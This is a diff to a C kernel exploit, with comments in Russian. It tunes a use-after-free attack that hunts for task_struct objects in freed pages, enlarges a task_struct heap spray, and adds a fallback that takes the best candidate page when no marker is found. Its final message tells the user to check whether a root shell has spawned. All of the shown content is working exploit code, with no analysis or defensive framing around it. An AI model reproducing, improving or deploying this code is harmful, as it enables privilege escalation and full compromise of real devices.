@@ -1763,35 +1763,37 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
 
 static int analyze_uaf_page(uint8_t *data, uint64_t va) {
     // FAST CHECK: Ищем маркер по типичному смещению comm (0x818 для ROG)
-    // Мы проверяем небольшое окно 0x810-0x830
-    for (int i = 0x810; i < 0x830; i++) {
+    // Мы проверяем небольшое окно 0x000-0xf00
+    for (int i = 0; i < 4096 - 8; i += 4) {
         if (memcmp(data + i, MARKER_NAME, 8) == 0) {
             fprintf(stderr, "\n      [!!!] MARKER MATCH at VA 0x%lx (off 0x%x)", (unsigned long)va, i);
+            gbuf[GBUF_COMM_OFF] = i; // Save real comm offset
             return 200; // Нашли!
         }
     }
 
     // SECOND FAST CHECK: Плотность указателей ядра
-    // В task_struct их должно быть очень много (>100)
     int kptrs = 0;
     for (int i = 0; i < 512; i++) {
         uint64_t val = ((uint64_t*)data)[i];
-        // Типичный диапазон ядерных адресов
         if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
             kptrs++;
         }
     }
 
-    // Если kptrs мало, это точно не то, что мы ищем. Сразу убиваем проверку.
     if (kptrs < 100) return 0;
 
     // Только если kptrs много, делаем более детальный анализ строк
     char found_str[64] = {0};
+    int has_letter = 0;
     int strings = 0;
     for (int i = 0; i < 4096 - 4; i++) {
         if (data[i] >= 0x20 && data[i] <= 0x7e) {
             int len = 0;
-            while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 63) len++;
+            while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 63) {
+                if ((data[i+len] >= 'a' && data[i+len] <= 'z') || (data[i+len] >= 'A' && data[i+len] <= 'Z')) has_letter = 1;
+                len++;
+            }
             if (len >= 4) {
                 strings++;
                 if (found_str[0] == 0) {
@@ -1803,8 +1805,8 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         }
     }
     
-    // Игнорируем эхо самого эксплойта
-    if (strstr(found_str, "Sample:\"") || strstr(found_str, "K-PTRs:")) return 0; 
+    // Игнорируем эхо самого эксплойта и мусор без букв
+    if (strstr(found_str, "Sample:\"") || strstr(found_str, "K-PTRs:") || !has_letter) return 0; 
 
     fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | Sample:\"%s\"", 
             (unsigned long)va, kptrs, strings, found_str);
@@ -2859,9 +2861,9 @@ restart:;
         fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
     }
 
-    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 8,000)\n");
-    int total_limit = 8000;
-    int batch_size = 1000;
+    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 15,000)\n");
+    int total_limit = 15000;
+    int batch_size = 3000;
     int total_sprayed = 0;
     int marker_found_global = 0;
     pid_t spray_pids[100];
@@ -2898,6 +2900,14 @@ restart:;
             marker_found_global = 1;
             free(found_pages);
             break; 
+        }
+        
+        // PLAN B: Если маркер не найден, но есть страницы с высокой плотностью kptrs
+        if (num_found > 0) {
+            fprintf(stderr, "\n    [*] PLAN B: Marker not found, but caught %d active kernel pages. Using best candidate.", num_found);
+            marker_found_global = 1;
+            free(found_pages);
+            break;
         }
         free(found_pages);
 
@@ -3245,5 +3255,9 @@ restart:;
     }
 
     fprintf(stderr, "[+] Done! Check if root shell spawned.\n");
+    if (g_uaf_mmap_ptr && g_uaf_mmap_ptr != MAP_FAILED) munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
+    if (gbuf && gbuf != MAP_FAILED) munmap(gbuf, PAGE_SIZE);
+    if (fd > 0) close(fd);
+    if (fd2 > 0) close(fd2);
     return 0;
 }
